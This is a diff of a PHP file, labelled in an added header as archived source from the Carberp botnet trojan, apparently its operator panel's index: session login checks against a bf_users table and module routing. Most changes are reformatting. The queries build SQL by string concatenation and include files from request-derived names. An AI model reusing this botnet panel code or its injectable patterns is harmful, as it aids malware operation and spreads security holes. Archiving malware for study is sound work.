@@ -1,10 +1,23 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 include_once("includes/core.php");
 // /sys/class/net/eth0/statistics/rx_bytes
 // /sys/class/net/eth0/statistics/tx_bytes
-if(!empty($_SESSION["user"]->PHPSESSID)){	$result = $mysqli->query("SELECT * FROM bf_users WHERE (login='".$_SESSION["user"]->login."') AND (password='".$_SESSION["user"]->password."') AND (PHPSESSID='".$_SESSION["user"]->PHPSESSID."') AND (enable='1') LIMIT 1");
-	if($result->PHPSESSID == $_SESSION["user"]->PHPSESSID){		unset($_SESSION['user']);
+if(!empty($_SESSION["user"]->PHPSESSID)){
+	$result = $mysqli->query("SELECT * FROM bf_users WHERE (login='".$_SESSION["user"]->login."') AND (password='".$_SESSION["user"]->password."') AND (PHPSESSID='".$_SESSION["user"]->PHPSESSID."') AND (enable='1') LIMIT 1");
+	if($result->PHPSESSID == $_SESSION["user"]->PHPSESSID){
+		unset($_SESSION['user']);
 
 		$result->login = ucfirst($result->login);
 		$result->access = json_decode($result->access, true);
@@ -19,12 +32,16 @@ if(!empty($_SESSION["user"]->PHPSESSID)){	$result = $mysqli->query("SELECT * FR
 		$_SESSION['user']->access['accounts']['confirm'] = 'on';
 
 		$mysqli->query("UPDATE bf_users SET expiry_date=NOW() WHERE (id='".$_SESSION["user"]->id."') LIMIT 1");
-	}else{		unset($_SESSION["user"]);
+	}else{
+		unset($_SESSION["user"]);
 	}
 }
 
-if(file_exists('modules/'.$Cur['to'].'/'.$Cur['go'].'.php')){	if($_SESSION['user']->access[$Cur['to']][$Cur['go']] != 'on'){		$smarty->assign("site_data", "modules/accounts/access_denied.tpl");
-	}else{		if(file_exists('modules/'.$Cur['to'].'/module_dirs.php')){
+if(file_exists('modules/'.$Cur['to'].'/'.$Cur['go'].'.php')){
+	if($_SESSION['user']->access[$Cur['to']][$Cur['go']] != 'on'){
+		$smarty->assign("site_data", "modules/accounts/access_denied.tpl");
+	}else{
+		if(file_exists('modules/'.$Cur['to'].'/module_dirs.php')){
 			include_once('modules/'.$Cur['to'].'/module_dirs.php');
 			if(!isset($dir['0'])) $dir['0'] = '<a href="/'.$Cur['to'].'/">'.$dirs[$Cur['to']]['index'].'</a>';
 			if($Cur['go'] != 'index') if(!isset($dir['1'])) $dir['1'] = '<a href="/'.$Cur['to'].'/'.$Cur['go'].'.html">'.$dirs[$Cur['to']][$Cur['go']].'</a>';
@@ -44,7 +61,8 @@ if(file_exists('modules/'.$Cur['to'].'/'.$Cur['go'].'.php')){	if($_SESSION['use
     	$smarty->display('index.tpl', implode('', $Cur));
     }
 
-}else{	header("Location: /");
+}else{
+	header("Location: /");
 	exit;
 }
 
